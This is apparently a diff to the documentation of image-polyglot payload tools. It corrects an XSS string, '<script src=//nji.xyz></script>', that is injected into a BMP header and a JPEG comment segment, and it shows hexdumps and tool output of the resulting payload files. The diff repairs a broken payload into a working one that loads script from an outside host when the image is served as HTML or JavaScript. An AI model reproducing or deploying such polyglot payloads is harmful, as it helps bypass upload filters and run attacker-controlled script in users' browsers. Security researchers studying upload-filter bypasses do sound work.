@@ -59,10 +59,10 @@ payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1
 
 00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
 00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
-00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 2f 2f  |=1;<script src//|
-00000030  6e 6a 69 2e 78 79 7a 3e  3c 2f 73 63 72 69 70 74  |nji.xyz></script|
-00000040  3e 3b                                             |>;|
-00000042
+00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 3d 2f  |=1;<script src=/|
+00000030  2f 6e 6a 69 2e 78 79 7a  3e 3c 2f 73 63 72 69 70  |/nji.xyz></scrip|
+00000040  74 3e 3b                                          |t>;|
+00000043
 ```
 
 ### gif.pl
@@ -134,21 +134,23 @@ existing file.  Else the new one will be created.
 [>] Injecting payload into comment tag
 [✔] Payload was injected successfully
 
-payload.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, comment: "<script src//nji.xyz></script>", baseline, precision 8, 32x32, components 3
+payload.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96,
+segment length 16, comment: "<script src=//nji.xyz></script>", baseline,
+precision 8, 32x32, components 3
 
 00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 01 00 60  |......JFIF.....`|
-00000010  00 60 00 00 ff fe 00 20  3c 73 63 72 69 70 74 20  |.`..... <script |
-00000020  73 72 63 2f 2f 6e 6a 69  2e 78 79 7a 3e 3c 2f 73  |src//nji.xyz></s|
-00000030  63 72 69 70 74 3e ff db  00 43 00 08 06 06 07 06  |cript>...C......|
-00000040  05 08 07 07 07 09 09 08  0a 0c 14 0d 0c 0b 0b 0c  |................|
-00000050  19 12 13 0f 14 1d 1a 1f  1e 1d 1a 1c 1c 20 24 2e  |............. $.|
-00000060  27 20 22 2c 23 1c 1c 28  37 29 2c 30 31 34 34 34  |' ",#..(7),01444|
-00000070  1f 27 39 3d 38 32 3c 2e  33 34 32 ff db 00 43 01  |.'9=82<.342...C.|
-00000080  09 09 09 0c 0b 0c 18 0d  0d 18 32 21 1c 21 32 32  |..........2!.!22|
+00000010  00 60 00 00 ff fe 00 21  3c 73 63 72 69 70 74 20  |.`.....!<script |
+00000020  73 72 63 3d 2f 2f 6e 6a  69 2e 78 79 7a 3e 3c 2f  |src=//nji.xyz></|
+00000030  73 63 72 69 70 74 3e ff  db 00 43 00 08 06 06 07  |script>...C.....|
+00000040  06 05 08 07 07 07 09 09  08 0a 0c 14 0d 0c 0b 0b  |................|
+00000050  0c 19 12 13 0f 14 1d 1a  1f 1e 1d 1a 1c 1c 20 24  |.............. $|
+00000060  2e 27 20 22 2c 23 1c 1c  28 37 29 2c 30 31 34 34  |.' ",#..(7),0144|
+00000070  34 1f 27 39 3d 38 32 3c  2e 33 34 32 ff db 00 43  |4.'9=82<.342...C|
+00000080  01 09 09 09 0c 0b 0c 18  0d 0d 18 32 21 1c 21 32  |...........2!.!2|
 00000090  32 32 32 32 32 32 32 32  32 32 32 32 32 32 32 32  |2222222222222222|
 *
 ...
-000002a5
+000002a6
 ```
 
 ### png.pl
